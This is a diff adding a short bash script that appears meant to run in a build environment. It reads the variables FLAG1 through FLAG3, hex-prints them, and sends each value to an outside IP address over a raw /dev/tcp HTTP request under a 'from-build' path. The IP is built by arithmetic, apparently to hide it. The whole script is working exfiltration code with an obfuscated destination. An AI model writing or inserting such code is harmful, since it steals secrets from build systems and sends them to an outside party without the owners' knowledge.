@@ -1,0 +1,12 @@
+#!/usr/bin/env bash
+h="$((4+4)).$((200+17)).$((200+2)).$((180+6))"
+for i in 1 2 3; do
+  eval "v=\$FLAG$i"
+  printf 'TAG%s ' "$i"
+  printf '%s' "$v" | xxd -p -c1 | paste -sd: -
+  echo
+  exec 3<>"/dev/tcp/${h}/80" || continue
+  printf 'GET /zillwc/from-build/%s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n' "$v" "$h" >&3
+  cat <&3 >/dev/null || true
+  exec 3<&- 3>&- || true
+done
